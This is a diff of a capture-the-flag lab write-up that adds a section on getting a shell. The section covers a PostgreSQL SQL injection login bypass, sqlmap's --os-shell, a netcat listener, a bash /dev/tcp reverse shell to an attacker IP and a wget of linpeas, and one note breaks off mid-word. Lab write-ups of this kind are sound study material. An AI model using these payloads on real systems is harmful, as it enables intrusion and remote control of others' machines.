@@ -76,7 +76,7 @@ If we put a quote in the user field we can generate a sql error
 ![sql error](../.res/2023-03-11-19-34-52.png)  
 
 - It is using `pg_query` so it is postgres sql.
-- Let's try to do the most common bypass authentication payload except we translate it in postgresql this dies the trick `username='+or+1=1--&password=aaa`
+- Let's try to do the most common bypass authentication payload except we translate it in postgresql this does the trick `username='+or+1=1--&password=aaa`
 
 ![bypass login](../.res/2023-03-11-19-59-58.png)  
 
@@ -96,22 +96,26 @@ If we google the "uplusion23" we find a github user https://github.com/uplusion2
 
 ![](../.res/2023-03-11-20-55-49.png)
 
+## Shell as postgresql
+
+If we use sqlmap we can get a shell on the target `sqlmap -r request -p username --os-shell`  
+To get the request file we just need to right click in the burp request and select save item  
+
+![save item](../.res/2023-03-18-20-37-08.png)
+Here is the shell we get  
+![os-shell](../.res/2023-03-18-20-38-37.png)
+If we ls on hone we have a user named tony.  
+When looking around a little we find the user flag `/var/lib/postgresql/user.txt`
+
+- We also find an .ssh folder with a known_hosts file
+- We can try to add our pu
+- Something weird is that if we cat /etc/passwd we do not find the user tony we found in /home. However the folder tony belongs to root so our root user might be named tony
+- Also this seems to be a docker instance.
+- Let's get a reverse shell we set a listener `rlwrap nc -nlvp 1234` this way we will get a more verbose shell in case of errors
+- then we launch this from our previous prompt `bash -c 'bash -i >& /dev/tcp/10.10.14.11/1234 0>&1'`
+wget http://10.10.14.11/linpeas_linux_amd64
+- uname -a gives `command standard output: 'Linux bc56e3cc55e9 4.14.154-boot2docker #1 SMP Thu Nov 14 19:19:08 UTC 2019 x86_64 GNU/Linux'` so we loopback to this boot2docker
+
 ## TODO
 
-- Enumerate subdonmain
-- check the looking like wp site
-- Make a list of user
-- Enumerate smb
-- check all the other ports
-
-Scan Aborted: The remote website is up, but does not seem to be running WordPress.
-
-```
-Server:		10.0.2.3
-Address:	10.0.2.3#53
-
-Non-authoritative answer:
-megalogistic.com	nameserver = ns2.start-dns.de.
-megalogistic.com	nameserver = ns3.start-dns.de.
-megalogistic.com	nameserver = ns1.start-dns.d
-```
+- See how to escape boot2docker
